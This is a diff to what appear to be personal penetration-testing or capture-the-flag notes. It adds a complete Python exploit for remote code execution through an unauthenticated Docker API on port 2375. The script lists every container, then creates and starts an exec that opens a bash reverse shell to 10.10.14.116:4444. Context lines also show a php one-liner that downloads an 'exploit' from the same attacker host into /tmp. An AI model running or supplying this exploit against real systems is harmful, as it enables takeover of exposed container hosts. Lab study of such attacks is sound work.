@@ -67,3 +67,60 @@ wget https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan
 ![[Pasted image 20251209180701.png]]
 
 php -r "copy('http://10.10.14.116:8000/exploit', '/tmp/poc');"
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py
+
+```python
+from __future__ import print_function
+import requests
+import logging
+import json
+import urllib.parse
+
+# NOTE
+# Enable Remote API with the following command
+# /usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock
+# This is an intended feature, remember to filter the port 2375..
+
+name          = "docker"
+description   = "Docker RCE via Open Docker API on port 2375"
+author        = "Swissky"
+
+# Step 1 - Extract id and name from each container
+ip   = "192.168.65.7"
+port = "2375"
+data = "containers/json"
+url  = "http://{}:{}/{}".format(ip, port, data)
+r = requests.get(url)
+
+if r.json:
+    for container in r.json():
+        container_id   = container['Id']
+        container_name = container['Names'][0].replace('/','')
+        print((container_id, container_name))
+
+        # Step 2 - Prepare command
+        cmd = ' ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.116/4444 0>&1"]'
+
+
+        data = "containers/{}/exec".format(container_name)
+        url = "http://{}:{}/{}".format(ip, port, data)
+        post_json = '{ "AttachStdin":false,"AttachStdout":true,"AttachStderr":true, "Tty":false, "Cmd":'+cmd+' }'
+        post_header = {
+            "Content-Type": "application/json"
+        }
+        r = requests.post(url, json=json.loads(post_json))
+
+
+        # Step 3 - Execute command
+        id_cmd = r.json()['Id']
+        data = "exec/{}/start".format(id_cmd)
+        url = "http://{}:{}/{}".format(ip, port, data)
+        post_json = '{ "Detach":false,"Tty":false}'
+        post_header = {
+            "Content-Type": "application/json"
+        }
+        r = requests.post(url, json=json.loads(post_json))
+        print(r)
+```
+
